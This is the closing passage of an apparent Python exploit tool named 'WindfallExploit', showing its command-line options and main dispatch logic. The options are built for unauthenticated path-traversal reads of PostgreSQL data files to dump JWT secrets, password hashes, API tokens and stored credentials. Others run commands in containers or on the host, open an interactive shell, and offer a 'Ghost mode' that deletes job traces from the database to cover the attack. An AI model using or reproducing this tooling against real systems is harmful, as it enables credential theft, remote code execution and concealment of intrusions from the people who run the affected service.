    parser.add_argument("--leak-postgres", action="store_true", help="Leak jwt_secret from PostgreSQL data files")
    parser.add_argument("--clean", action="store_true", help="Ghost mode: DELETE all job traces from DB")

    # PostgreSQL file dumps (NO AUTH NEEDED - just path traversal!)
    dump_group = parser.add_argument_group("PostgreSQL file dumps (NO AUTH - reads raw DB files)")
    dump_group.add_argument("--dump-secrets", action="store_true", help="Dump secrets from PG files (jwt_secret, etc.)")
    dump_group.add_argument("--dump-users", action="store_true", help="Dump users + argon2 hashes from PG files")
    dump_group.add_argument("--dump-tokens", action="store_true", help="Dump API tokens from PG files")
    dump_group.add_argument("--dump-resources", action="store_true", help="Dump resources (creds, API keys) from PG files")
    dump_group.add_argument("--dump-all", action="store_true", help="Dump everything from PG files")

    args = parser.parse_args()
    
    pwn = WindfallExploit(args.url, nc_user=args.nc_user, nc_pass=args.nc_pass)
    
    if args.read:
        handle_read(pwn, args.read)
    elif args.leak_users:
        handle_leak_users(pwn)
    elif args.leak_postgres:
        handle_leak_postgres(pwn)
    elif args.dump_all or args.dump_secrets or args.dump_users or args.dump_tokens or args.dump_resources:
        # PostgreSQL file dumps - NO AUTH NEEDED!
        print(BANNER)
        log.info(f"Target: {pwn.url}")
        if not pwn._detect_deployment():
            return
        if not pwn.check_vulnerable():
            return

        if args.dump_all or args.dump_secrets:
            print("\n" + "=" * 50)
            print("SECRETS (from PostgreSQL files - NO AUTH)")
            print("=" * 50)
            pwn.dump_secrets_from_files()

        if args.dump_all or args.dump_users:
            print("\n" + "=" * 50)
            print("USERS + HASHES (from PostgreSQL files - NO AUTH)")
            print("=" * 50)
            pwn.dump_users_from_files()

        if args.dump_all or args.dump_tokens:
            print("\n" + "=" * 50)
            print("TOKENS (from PostgreSQL files - NO AUTH)")
            print("=" * 50)
            pwn.dump_tokens_from_files()

        if args.dump_all or args.dump_resources:
            print("\n" + "=" * 50)
            print("RESOURCES (from PostgreSQL files - NO AUTH)")
            print("=" * 50)
            pwn.dump_resources_from_files()
    elif args.cmd:
        with auto_cleanup(pwn, args.clean):
            handle_cmd(pwn, args.cmd, host=False)
    elif args.host_cmd:
        with auto_cleanup(pwn, args.clean):
            handle_cmd(pwn, args.host_cmd, host=True)
    else:
        with auto_cleanup(pwn, args.clean):
            handle_interactive_shell(pwn, host=args.host)


if __name__ == "__main__":
    main()
